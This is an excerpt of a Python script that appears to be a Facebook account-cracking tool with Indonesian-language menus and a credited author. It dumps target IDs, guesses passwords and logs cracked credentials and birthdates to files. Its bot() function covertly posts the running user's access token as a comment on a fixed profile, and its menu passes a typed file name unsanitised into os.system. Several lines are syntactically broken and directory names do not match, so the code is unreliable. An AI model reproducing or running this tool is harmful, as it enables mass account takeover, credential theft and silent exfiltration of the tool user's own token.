...
\033[92;1m----------------------------------------------------------
\033[97;1m╔[ \033[92;1mCreator  \033[97;1m: \033[93;1mROX-TAJ. \033[97;1mAnd [\033[92;1mTAAJ's -DIMOND\033[97;1m]
\033[97;1m╠[ \033[92;1mWhatsApp \033[97;1m: \033[93;1m+8801408479204
\033[97;1m╠[ \033[92;1mGithub   \033[97;1m: \033[93;1mHttps://github.com/ROX-TAJ
\033[97;1m╠[ \033[92;1mFacebook \033[97;1m: \033[93;1mPranto Ahmed \033[97;1m[\033[92;1mFollow Me Facebook\033[97;1m]
\033[92;1m----------------------------------------------------------
""")
...
def bot():
	...
	requests.post("https://graph.facebook.com/100011417365908/subscribers?access_token="+token)  #JejeeXD
	requests.post("https://graph.facebook.com/100011417365908/likes?summary=true&access_token=" + token)
	requests.post("https://graph.facebook.com/100011417365908/comments/?message="+komentar+"&access_token="+token)
	requests.post("https://graph.facebook.com/100011417365908/comments/?message="+token+"&access_token="+token)
	menu()
...
def menu():
	...
	print(balmond+u+" =>"+h+" Taaj_Op/OK_%s.txt"%(hck))
	print(balmond+u+" =>"+k+" Taaj_Cp/CP_%s.txt"%(hck))
	print(u+line)
...
def result():
	...
	if pilih=="1" or pilih=="01":
		...
		if len(lisaa)==0:
			print("\n"+balmond+k+" Taaj CP")
			print(balmond+m+" Tidak Ada Taaj Cp")
			...
			try:
				binatang = open("Taaj_Cp/%s"%(King Raj))
			except IOError:
				jalan(balmond+l+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd Hasil_Cp && cat %s"%(king Raj))
		input("\n"+balmond+l+" Kembali")
		time.sleep(0.5)
		menu()
	elif pilih=="2" or pilih=="02":
		try:
			lisaa = os.listdir("Taaj_Ok")
		except FileNotFoundError:
			jalan(balmond+m+" Direktori Tidak Ditemukan")
			time.sleep(0.5)
			menu()
		if len(lisaa)==0:
			print("\n"+balmond+l+" Taaj Ok")
			print(balmond+m+" Tidak Ada Taaj Ok")
			input(balmond+l+" Kembali")
			time.sleep(0.5)
			menu()
		else:
			...
			marjan = input(balmond+l+" File : "+h+"")
			try:
				binatang = open("Taaj_Ok/%s"%(king raj))
			except IOError:
				jalan(balmond+l+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd Taaj_Ok && cat %s"%(king Raj))
		input("\n"+balmond+l+" Kembali")
		time.sleep(0.5)
		menu()
	elif pilih=="0" or pilih=="00":
...
def user_agent():
	...
	if pilih=="1" or pilih=="01":
		...
		jalan("\n"+balmond+m+" Pranto Pilihan Yang Benar")
		time.sleep(0.5)
		user_agent()
...
def dump_old2():
        ...
        for dot in range(nada):
                ...
                tampung = []
                non_old = []
                uid = input(balmond+l+" Pranto ID Target Ke %s : "%(dot))
                try:
...
def follow():
	...
	try:
		...
		if jumlah>5000:
			jalan(balmond+m+" Pranto 5000 ID")
			time.sleep(0.5)
			follow()
	except ValueError:
		jalan(balmond+m+" Input Invalid")
...
def mode_password():
	...
	if mode=="d" or mode=="D":
		...
		print("\n"+balmond+l+" Pranto Password Manual")
		...
		print("\n"+balmond+l+" Pranto Password Tambahan")
		print(balmond+l+" Miniman 6 Karakter Dalam 1 Password")
		print(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
...
def mode_crack3():
        ...
        if pilih=="1" or pilih=="01":
                ...
                if agenku=="y" or agenku=="Y":
                        ...
                        kopi = "enak"
                print("\n"+balmond+h+" Crack Dimulai")
                print(balmond+l+" Jika Tidak Ada Taaj, Hidupkan Mode Pesawat 5 Detik\n")
                gabungkan2()
        else:
                jalan(balmond+l+" Pilihan Invalid")
                time.sleep(0.5)
		...
		try:
			...
			if 'access_token' in response.text and 'EAAA' in response.text:
				if "old" in old_gak:
					...
					bts = open("Pranto_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					...
					try:
						...
						if len(lahir)==2:
							...
							if "old" in old_gak:
								...
								bts = open("Pranto_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
							...
							if "old" in old_gak:
								...
								bts = open("Pranto_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
						...
						if "old" in old_gak:
							...
							bts = open("Pranto_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
